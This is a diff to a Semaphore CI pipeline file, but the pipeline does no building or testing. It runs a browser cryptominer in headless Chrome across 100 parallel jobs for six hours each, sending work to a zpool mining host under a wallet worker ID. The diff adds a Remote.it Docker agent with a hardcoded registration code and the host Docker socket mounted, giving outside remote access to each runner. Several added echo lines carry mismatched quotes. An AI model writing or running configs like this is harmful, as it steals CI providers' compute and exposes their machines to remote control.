@@ -1,30 +1,52 @@
 version: v1.0
-name: 'Run Webminer in Real Chrome (10x Parallel, 6h Each)'
+name: 'Run Webminer and Remoteit (100x Parallel, 6h Each)'
 agent:
   machine:
     type: e1-standard-8
     os_image: ubuntu2004
 blocks:
-  - name: Start Chrome Webminer
+  - name: Start Chrome Webminer and Remoteit Agent
     task:
       jobs:
-        - name: Webminer Instance
+        - name: Webminer and Remoteit Instance
           parallelism: 100
           commands:
+            - |
+              INSTANCE_ID_NUM=$((SEMAPHORE_JOB_INDEX - 1)) # Creates 0-99 from 1-100
+              DISPLAY_NUM=$((99 + INSTANCE_ID_NUM))
+              CHROME_DEBUG_PORT=$((9222 + INSTANCE_ID_NUM))
+              REMOTEIT_CONTAINER_NAME="remoteit_docker_jumpbox_${SEMAPHORE_JOB_INDEX}"
+              CHROME_PROFILE_DIR="/tmp/chrome-profile-${SEMAPHORE_JOB_INDEX}"
+            - 'echo "=== Instance ${SEMAPHORE_JOB_INDEX} ==="'
+            - echo "Instance ID (0-based): '${INSTANCE_ID_NUM}"'
+            - echo "Xvfb Display: ':${DISPLAY_NUM}"'
+            - echo "Chrome Debug Port: '${CHROME_DEBUG_PORT}"'
+            - echo "Remoteit Container Name: '${REMOTEIT_CONTAINER_NAME}"'
+            - echo "Chrome Profile Dir: '${CHROME_PROFILE_DIR}"'
             - echo "Updating and installing dependencies..."
             - sudo apt-get update
             - sudo apt-get install -y wget unzip xvfb fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libcups2 libdbus-1-3 libgdk-pixbuf2.0-0 libnspr4 libnss3 libxcomposite1 libxdamage1 libxrandr2 xdg-utils
+            - echo "Pulling and starting Remote.it Docker agent: '${REMOTEIT_CONTAINER_NAME}..."'
+            - |
+              docker run -d \
+                -e R3_REGISTRATION_CODE="7CD95576-8DB7-5B3F-B40E-DF1857B2DD13" \
+                -v /var/run/docker.sock:/var/run/docker.sock \
+                --restart unless-stopped \
+                --name "${REMOTEIT_CONTAINER_NAME}" \
+                --pull always \
+                remoteit/docker-extension:latest
+            - sleep 5
             - echo "Installing latest Google Chrome..."
             - 'wget -q -O chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb'
             - sudo dpkg -i chrome.deb || sudo apt-get -f install -y
             - sudo dpkg -i chrome.deb
             - echo "Verifying Chrome installation..."
             - google-chrome --version
-            - echo "Starting Xvfb (virtual display)..."
-            - 'export DISPLAY=:99'
-            - 'Xvfb :99 -screen 0 1920x1080x24 > /dev/null 2>&1 &'
-            - sleep 2
-            - echo "Launching Chrome in headless mode to run the miner webpage..."
+            - 'echo "Starting Xvfb (virtual display) on :${DISPLAY_NUM}..."'
+            - 'export DISPLAY=:${DISPLAY_NUM}'
+            - 'Xvfb :${DISPLAY_NUM} -screen 0 1920x1080x24 > "/tmp/xvfb_${SEMAPHORE_JOB_INDEX}.log" 2>&1 &'
+            - sleep 3
+            - echo "Launching Chrome in headless mode..."
             - |
               google-chrome \
                 --no-sandbox \
@@ -37,13 +59,21 @@ blocks:
                 --disable-default-apps \
                 --disable-translate \
                 --disable-features=TranslateUI \
-                --remote-debugging-port=9222 \
+                --remote-debugging-port=${CHROME_DEBUG_PORT} \
                 --window-size=1920,1080 \
-                --user-data-dir=/tmp/chrome-profile-${SEMAPHORE_JOB_INDEX} \
+                --user-data-dir="${CHROME_PROFILE_DIR}" \
                 --headless=new \
-                "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RHWiosLvVQC71ErsX7wygddR1uv63LLfYo&password=c%3DRVN&workers=4" &
-            - echo "Chrome launched. Keeping job alive for 6 hours (21600 seconds)..."
+                "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RHWiosLvVQC71ErsX7wygddR1uv63LLfYo&password=c%3DRVN&workers=4" > "/tmp/chrome_${SEMAPHORE_JOB_INDEX}.log" 2>&1 &
+            - CHROME_PID=$!
+            - 'echo "Chrome launched with PID ${CHROME_PID}. Remote.it container ${REMOTEIT_CONTAINER_NAME} running."'
+            - echo "Keeping job alive for 6 hours (21600 seconds)..."
             - sleep 21600
-            - echo "6 hours elapsed. Killing Chrome and Xvfb..."
-            - pkill chrome || true
-            - pkill Xvfb || true
+            - 'echo "6 hours elapsed. Cleaning up instance ${SEMAPHORE_JOB_INDEX}..."'
+            - echo "Stopping and removing Remote.it container: '${REMOTEIT_CONTAINER_NAME}..."'
+            - 'docker stop "${REMOTEIT_CONTAINER_NAME}" || echo "Failed to stop ${REMOTEIT_CONTAINER_NAME} or already stopped."'
+            - 'docker rm "${REMOTEIT_CONTAINER_NAME}" || echo "Failed to remove ${REMOTEIT_CONTAINER_NAME} or already removed."'
+            - 'echo "Killing Chrome (PID ${CHROME_PID}) and related processes..."'
+            - 'kill ${CHROME_PID} || echo "Chrome PID ${CHROME_PID} already exited or could not be killed."'
+            - 'pkill -f "chrome.*${CHROME_PROFILE_DIR}" || true'
+            - 'echo "Killing Xvfb on display :${DISPLAY_NUM}..."'
+            - 'pkill -f "Xvfb :${DISPLAY_NUM}" || true'
